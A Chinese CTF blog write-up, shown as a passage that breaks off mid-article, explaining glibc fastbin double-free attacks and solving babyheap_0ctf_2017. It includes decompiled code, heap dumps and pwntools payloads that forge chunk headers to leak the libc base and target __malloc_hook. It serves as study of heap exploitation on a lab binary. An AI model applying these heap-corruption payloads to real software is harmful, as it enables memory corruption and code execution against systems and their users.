@@ -1,0 +1,1233 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="fastbins attack 学习记录, F0und">
+    <meta name="description" content="fastbins attack ——Fastbin Double Free0x00 前言本篇为学习记录所用
+0x10 漏洞原理利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>fastbins attack 学习记录 | F0und</title>
+    <link rel="icon" type="image/png" href="/medias/fav.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F0und</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F0und</div>
+        <div class="logo-desc">
+            
+            今天不学习，今天就变垃圾
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        fastbins attack 学习记录
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-03-24
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.9k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        9 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="fastbins-attack-——Fastbin-Double-Free"><a href="#fastbins-attack-——Fastbin-Double-Free" class="headerlink" title="fastbins attack ——Fastbin Double Free"></a>fastbins attack ——Fastbin Double Free</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇为学习记录所用</p>
+<h2 id="0x10-漏洞原理"><a href="#0x10-漏洞原理" class="headerlink" title="0x10 漏洞原理"></a>0x10 漏洞原理</h2><p>利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写能力</p>
+<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int main(void)
+{
+    void *chunk1,*chunk2,*chunk3;
+    chunk1=malloc(0x30);
+    chunk2=malloc(0x30);
+    chunk3=malloc(0x30);
+    //进行释放
+    free(chunk1);
+    free(chunk2);
+    free(chunk3);
+    return 0;
+}
+</code></pre>
+<p>释放前</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">0x602000:   0x0000000000000000  0x0000000000000041 <=== chunk1
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000041 <=== chunk2
+0x602050:   0x0000000000000000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000041 <=== chunk3
+0x602090:   0x0000000000000000  0x0000000000000000
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000000000
+0x6020c0:   0x0000000000000000  0x0000000000020f41 <=== top chunk
+</code></pre>
+<p>执行三次 free 进行释放后</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">0x602000:   0x0000000000000000  0x0000000000000041 <=== chunk1
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000041 <=== chunk2
+0x602050:   0x0000000000602000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000041 <=== chunk3
+0x602090:   0x0000000000602040  0x0000000000000000
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000000000
+0x6020c0:   0x0000000000000000  0x0000000000020f41 <=== top chunk
+</code></pre>
+<p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">Fastbins[idx=2, size=0x30,ptr=0x602080]
+===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
+===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
+===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
+</code></pre>
+<p>Fastbin Double Free</p>
+<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p>
+<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
+<ol>
+<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
+<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
+</ol>
+<pre><code>/* Another simple check: make sure the top of the bin is not the
+       record we are going to add (i.e., double free).  */
+    if (__builtin_expect (old == p, 0))
+      {
+        errstr = "double free or corruption (fasttop)";
+        goto errout;
+}
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200324225625.png" alt=""></p>
+<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1 的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p>
+<h2 id="0x20-漏洞利用"><a href="#0x20-漏洞利用" class="headerlink" title="0x20 漏洞利用"></a>0x20 漏洞利用</h2><p>babyheap_0ctf_2017</p>
+<p>题目来源：buuoj</p>
+<p>考点：堆溢出, <strong>fastbin attack</strong></p>
+<p>难度：baby</p>
+<p>你说它是个BABY那他就是吧</p>
+<h3 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h3><p>file:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">babyheap_0ctf_2017: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
+</code></pre>
+<p>64位动态链接库文件</p>
+<p>checksec:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p>堆溢出都是这样的保护全开</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">===== Baby Heap in 2017 =====
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+</code></pre>
+<p>程序提供了5个功能</p>
+<ul>
+<li>Allocate - 调用 calloc 分配小于 0x1000 大小的内存，calloc 分配的 chunk 会被清空。</li>
+<li>Fill - 填充任意大小的内存，意味着可以覆盖其它 chunk。</li>
+<li>Free - 释放一块 chunk。</li>
+<li>Dump - 输出限制大小的 chunk 内容。</li>
+</ul>
+<p>ida 反汇编</p>
+<p><strong>1. Allocate</strong></p>
+<blockquote>
+<p>分配内存</p>
+</blockquote>
+<pre class=" language-lang-c"><code class="language-lang-c">void __fastcall sub_D48(__int64 a1)
+{
+  signed int i; // [rsp+10h] [rbp-10h]
+  signed int v2; // [rsp+14h] [rbp-Ch]
+  void *v3; // [rsp+18h] [rbp-8h]
+
+  for ( i = 0; i <= 15; ++i )
+  {
+    if ( !*(24LL * i + a1) )
+    {
+      printf("Size: ");
+      v2 = sub_138C();
+      if ( v2 > 0 )
+      {
+        if ( v2 > 4096 )
+          v2 = 4096;
+        v3 = calloc(v2, 1uLL);
+        if ( !v3 )
+          exit(-1);
+        *(24LL * i + a1) = 1;
+        *(a1 + 24LL * i + 8) = v2;
+        *(a1 + 24LL * i + 16) = v3;
+        printf("Allocate Index %d\n", i);
+      }
+      return;
+    }
+  }
+}
+</code></pre>
+<p><strong>2. Fill</strong></p>
+<blockquote>
+<p>填充内容，可填充任意字长的内容，漏洞就出在此处。</p>
+</blockquote>
+<pre class=" language-lang-c"><code class="language-lang-c">__int64 __fastcall sub_E7F(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+18h] [rbp-8h]
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = sub_138C();
+  v2 = result;
+  if ( result >= 0 && result <= 15 )
+  {
+    result = *(24LL * result + a1);
+    if ( result == 1 )
+    {
+      printf("Size: ");
+      result = sub_138C();
+      v3 = result;            //这里对输入长度没有限制
+      if ( result > 0 )
+      {
+        printf("Content: ");
+        result = sub_11B2(*(24LL * v2 + a1 + 16), v3);
+      }
+    }
+  }
+  return result;
+}
+</code></pre>
+<p><strong>3. Free</strong></p>
+<blockquote>
+<p>释放内存</p>
+</blockquote>
+<pre class=" language-lang-c"><code class="language-lang-c">__int64 __fastcall sub_F50(__int64 a1)
+{
+  __int64 result; // rax
+  int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = sub_138C();
+  v2 = result;
+  if ( result >= 0 && result <= 15 )
+  {
+    result = *(24LL * result + a1);
+    if ( result == 1 )
+    {
+      *(24LL * v2 + a1) = 0;
+      *(24LL * v2 + a1 + 8) = 0LL;
+      free(*(24LL * v2 + a1 + 16));
+      result = 24LL * v2 + a1;
+      *(result + 16) = 0LL;
+    }
+  }
+  return result;
+}
+</code></pre>
+<p><strong>4. Dump</strong></p>
+<blockquote>
+<p>打印内容</p>
+</blockquote>
+<pre class=" language-lang-c"><code class="language-lang-c">signed int __fastcall sub_1051(__int64 a1)
+{
+  signed int result; // eax
+  signed int v2; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = sub_138C();
+  v2 = result;
+  if ( result >= 0 && result <= 15 )
+  {
+    result = *(24LL * result + a1);
+    if ( result == 1 )
+    {
+      puts("Content: ");
+      sub_130F(*(24LL * v2 + a1 + 16), *(24LL * v2 + a1 + 8));
+      result = puts(byte_14F1);
+    }
+  }
+  return result;
+}
+</code></pre>
+<p>利用思路：</p>
+<p>在fill的地方存在一个堆溢出，可以写任意长度，因为分配使用的calloc，所以在分配的时候会将分配出来的chunk先清空，dump的大小是根据alloc指定的size决定的，跟真正的chunk大小无关。</p>
+<h3 id="0x10-Leak-Libc"><a href="#0x10-Leak-Libc" class="headerlink" title="0x10 Leak Libc"></a>0x10 Leak Libc</h3><p>程序没有 uaf ，内存被释放后无法查看其中内容，可以通过 double free 获得指向 small bin 的 index，将其释放后 dump 出来。</p>
+<p>首先分配一系列相同大小的 fast chunk，再分配一个 small chunk，释放掉其中一个 fast chunk。</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+
+    free(1)
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/48wx 0x55a1cc17d000
+0x55a1cc17d000:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk0(fastbin,in use)
+0x55a1cc17d010:    0x00000000    0x00000000    0x00000000    0x00000000
+0x55a1cc17d020:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk1(fastbin ,free)
+0x55a1cc17d030:    0x00000000    0x00000000    0x00000000    0x00000000
+0x55a1cc17d040:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk2(fastbin ,in use)
+0x55a1cc17d050:    0x00000000    0x00000000    0x00000000    0x00000000
+0x55a1cc17d060:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk3(fastbin ,in use)
+0x55a1cc17d070:    0x00000000    0x00000000    0x00000000    0x00000000
+0x55a1cc17d080:    0x00000000    0x00000000    0x00000091    0x00000000  ==>chunk4(smallbins ,in use)
+0x55a1cc17d090:    0x00000000    0x00000000    0x00000000    0x00000000
+0x55a1cc17d0a0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x55a1cc17d0b0:    0x00000000    0x00000000    0x00000000    0x00000000
+gdb-peda$ x/32xw &main_arena
+0x7f001f560b20 <main_arena>:    0x00000000    0x00000000    0xcc17d020    0x000055a1 ==>fastbin[0]
+0x7f001f560b30 <main_arena+16>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7f001f560b40 <main_arena+32>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7f001f560b50 <main_arena+48>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7f001f560b60 <main_arena+64>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7f001f560b70 <main_arena+80>:    0x00000000    0x00000000    0xcc17d110    0x000055a1
+0x7f001f560b80 <main_arena+96>:    0x00000000    0x00000000    0x1f560b78    0x00007f00
+0x7f001f560b90 <main_arena+112>:    0x1f560b78    0x00007f00    0x1f560b88    0x00007f00
+</code></pre>
+<p>释放的那个 fast chunk 被放入到 fastbin 中，fastbin 为单链表形式，如果再释放一个 fast chunk，将其插入 fastbin 的头部，释放的第二个 chunk 其 fd 会被设置成第一个 chunk 的地址。</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x80)
+
+    free(1)
+    free(2)
+</code></pre>
+<pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/48wx 0x56365c80a000
+0x56365c80a000:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk0(fastbin,in use)
+0x56365c80a010:    0x00000000    0x00000000    0x00000000    0x00000000
+0x56365c80a020:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk1(fastbin,free)
+0x56365c80a030:    0x00000000    0x00000000    0x00000000    0x00000000
+0x56365c80a040:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk2(fastbin,free)
+0x56365c80a050:    0x5c80a020    0x00005636    0x00000000    0x00000000
+0x56365c80a060:    0x00000000    0x00000000    0x00000021    0x00000000  ==>chunk3(fastbin,in use)
+0x56365c80a070:    0x00000000    0x00000000    0x00000000    0x00000000
+0x56365c80a080:    0x00000000    0x00000000    0x00000091    0x00000000  ==>chunk4(fastbin,in use)
+0x56365c80a090:    0x00000000    0x00000000    0x00000000    0x00000000
+0x56365c80a0a0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x56365c80a0b0:    0x00000000    0x00000000    0x00000000    0x00000000
+gdb-peda$ x/32xw &main_arena
+0x7fe892d7eb20 <main_arena>:    0x00000000    0x00000000    0x5c80a040    0x00005636 ==>最新释放的 chunk
+0x7fe892d7eb30 <main_arena+16>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7fe892d7eb40 <main_arena+32>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7fe892d7eb50 <main_arena+48>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7fe892d7eb60 <main_arena+64>:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7fe892d7eb70 <main_arena+80>:    0x00000000    0x00000000    0x5c80a110    0x00005636
+0x7fe892d7eb80 <main_arena+96>:    0x00000000    0x00000000    0x92d7eb78    0x00007fe8
+0x7fe892d7eb90 <main_arena+112>:    0x92d7eb78    0x00007fe8    0x92d7eb88    0x00007fe8
+</code></pre>
+<p>此时使用 fill 覆盖 fastbin 头部 chunk 的 fd 值，将其改写成 small chunk 的地址，那么通过两次 alloc，先将 small chunk 放入 fastbin，再将其取出来，获得指向它的 index。要这么做必须绕过 malloc 的安全检查：</p>
+<pre class=" language-lang-c"><code class="language-lang-c">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
+{
+    errstr = "malloc(): memory corruption (fast)";
+errout:
+    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
+    return NULL;
+}
+</code></pre>
+<p>查看其 chunksize 与相应的 fastbin_index 是否匹配，实际上 chunksize 的计算方法是 <code>victim-&gt;size &amp; ~(SIZE_BITS))</code>，而它对应的 index 计算方法为 <code>(size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2</code>，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 <code>(size &gt;&gt; 4) - 2</code>，那么我们将 small chunk 的 size 域改写成 0x21 即可。</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x80)
+
+    free(1)
+    free(2)
+    payload = p64(0)*3
+    payload += p64(0x21)
+    payload += p64(0)*3
+    payload += p64(0x21)
+    payload += p8(0x80)
+    fill(0, payload)
+
+    payload = p64(0)*3
+    payload += p64(0x21)
+    fill(3, payload)
+
+    Allocate(0x10)
+    Allocate(0x10)
+
+0x441a4924a940:    0x0000000000000001    0x0000000000000010
+0x441a4924a950:    0x000056254a9bc010    0x0000000000000001
+0x441a4924a960:    0x0000000000000010    0x000056254a9bc050
+0x441a4924a970:    0x0000000000000001    0x0000000000000010
+0x441a4924a980:    0x000056254a9bc090    0x0000000000000001
+0x441a4924a990:    0x0000000000000010    0x000056254a9bc070
+0x441a4924a9a0:    0x0000000000000001    0x0000000000000080
+0x441a4924a9b0:    0x000056254a9bc090    0x0000000000000000
+0x441a4924a9c0:    0x0000000000000000    0x0000000000000000
+0x441a4924a9d0:    0x0000000000000000    0x0000000000000000
+</code></pre>
+<p>可以看到 index[2] 存放的是 small chunk 的地址，此时将 small chunk 的 size 改写回来，将其释放掉就可以 dump 出来了。</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x80)
+
+    free(1)
+    free(2)
+    payload = p64(0)*3
+    payload += p64(0x21)
+    payload += p64(0)*3
+    payload += p64(0x21)
+    payload += p8(0x80)
+    fill(0, payload)
+
+    payload = p64(0)*3
+    payload += p64(0x21)
+    fill(3, payload)
+
+    Allocate(0x10)
+    Allocate(0x10)
+
+    payload = p64(0)*3
+    payload += p64(0x91)
+    fill(3, payload)
+    Allocate(0x80)
+    free(4)
+
+    libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78
+    log.info("libc_base: "+hex(libc_base))
+</code></pre>
+<p>可以发现 index 为 2 的 chunk 的 fd 指针指向 index 为 1 的 chunk 。</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">payload = p64(0) * 3
+payload += p64(0x21)
+payload += p64(0) * 3
+payload += p64(0x21)
+payload += p8(0x80)
+fill(0,payload)
+</code></pre>
+<p>  把 chunk 2 的内容覆盖为 chunk 4 的地址，这样相当于 chunk 4 已经被 free 了而且被存放在 fastbin 中。</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">payload = p64(0) * 3
+payload += p64(0x21)
+fill(3,payload)
+</code></pre>
+<p>  此时 heap 如下</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x /40xg 0x55a64a9e8000 3
+0x55a64a9e8000: 0x0000000000000000  0x0000000000000021  chunk 0 
+0x55a64a9e8010: 0x0000000000000000  0x0000000000000000
+0x55a64a9e8020: 0x0000000000000000  0x0000000000000021  chunk 1
+0x55a64a9e8030: 0x0000000000000000  0x0000000000000000
+0x55a64a9e8040: 0x0000000000000000  0x0000000000000021  chunk 2
+0x55a64a9e8050: 0x000055a64a9e8080  0x0000000000000000
+0x55a64a9e8060: 0x0000000000000000  0x0000000000000021  chunk 3
+0x55a64a9e8070: 0x0000000000000000  0x0000000000000000
+0x55a64a9e8080: 0x0000000000000000  0x0000000000000021  chunk 4
+0x55a64a9e8090: 0x0000000000000000  0x0000000000000000
+0x55a64a9e80a0: 0x0000000000000000  0x0000000000000000
+0x55a64a9e80b0: 0x0000000000000000  0x0000000000000000
+0x55a64a9e80c0: 0x0000000000000000  0x0000000000000000
+0x55a64a9e80d0: 0x0000000000000000  0x0000000000000000
+0x55a64a9e80e0: 0x0000000000000000  0x0000000000000000
+0x55a64a9e80f0: 0x0000000000000000  0x0000000000000000
+0x55a64a9e8100: 0x0000000000000000  0x0000000000000000
+0x55a64a9e8110: 0x0000000000000000  0x0000000000020ef1
+0x55a64a9e8120: 0x0000000000000000  0x0000000000000000
+0x55a64a9e8130: 0x0000000000000000  0x0000000000000000
+</code></pre>
+<p>  我们等下要 malloc 回 chunk 4 ，可是 malloc fastbin 有检查， chunksize 必须与相应的 fastbin_index 匹配，所以我们覆盖 chunk 4 的 size 为 fastbin 大小</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x10)
+allocate(0x10)
+payload = p64(0) * 3
+payload += p64(0x91)
+fill(3,payload)
+allocate(0x80)
+free(4)
+
+libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78
+log.info("libc_base: "+hex(libc_base))
+</code></pre>
+<p>  unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 ，所以得到这个fd的值，然后减去0x58再减去main_arena相对于libc的固定偏移，即得到libc的基地址。所以我们需要把 chunk 改成大于 fastbin 的大小，这样 free 后能进入 unsortbin 让我们能够泄露 libc 基址。<br>  我们的目标是覆盖 __malloc_hook 函数，这样我们调用 malloc 时就相当于调用我们写入的内容</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/32xw (long long)(&main_arena)-0x40
+0x7f2a8a09eae0 <_IO_wide_data_0+288>:   0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eaf0 <_IO_wide_data_0+304>:   0x8a09d260  0x00007f2a  0x00000000  0x00000000
+0x7f2a8a09eb00 <__memalign_hook>:   0x89d5fe20  0x00007f2a  0x89d5fa00  0x00007f2a
+0x7f2a8a09eb10 <__malloc_hook>: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb20 <main_arena>:    0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb30 <main_arena+16>: 0x00000000  0x00000000  0x00000000  0x00000000
